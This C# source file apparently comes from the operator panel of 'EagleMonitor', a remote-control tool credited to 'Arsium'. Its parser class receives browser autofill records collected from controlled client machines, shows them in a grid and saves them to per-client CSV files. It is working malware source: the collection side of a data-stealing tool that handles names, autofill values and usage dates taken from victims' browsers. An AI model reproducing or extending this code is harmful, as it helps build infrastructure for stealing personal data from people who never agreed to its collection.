using EagleMonitor.Networking;
using EagleMonitor.Utils;
using PacketLib.Packet;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class AutofillPacketParser
    {
        public AutofillPacketParser(AutofillPacket autofillPacket, ClientHandler clientHandler)
        {
            new Thread(() =>
            {
                if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Autofill\\"))
                    System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Autofill");
                if (autofillPacket.autofillList != null)
                {
                    try
                    {
                        if (clientHandler.autofillForm.dataGridView1 != null)
                        {
                            clientHandler.autofillForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                            {
                                clientHandler.autofillForm.dataGridView1.Rows.Clear();
                                foreach (object[] str in autofillPacket.autofillList)
                                {
                                    int rowId = clientHandler.autofillForm.dataGridView1.Rows.Add();
                                    DataGridViewRow row = clientHandler.autofillForm.dataGridView1.Rows[rowId];
                                    row.Cells["Column1"].Value = str[0].ToString();
                                    row.Cells["Column2"].Value = str[1].ToString();
                                    row.Cells["Column3"].Value = str[2].ToString();
                                    row.Cells["Column4"].Value = str[3].ToString();
                                    row.Cells["Column5"].Value = str[4].ToString();
                                }
                                Miscellaneous.ToCSV(clientHandler.autofillForm.dataGridView1, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv");
                                clientHandler.autofillForm.loadingCircle1.Visible = false;
                                clientHandler.autofillForm.loadingCircle1.Active = false;
                            }));
                        }
                        else
                        { Miscellaneous.ToCSV(autofillPacket.autofillList, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
                    }
                    catch { Miscellaneous.ToCSV(autofillPacket.autofillList, clientHandler.clientPath + "\\Autofill\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Name", "Autofill", "Date created", "Last date used" }); }
                }
                else
                    return;
            }).Start();
        }
    }
}
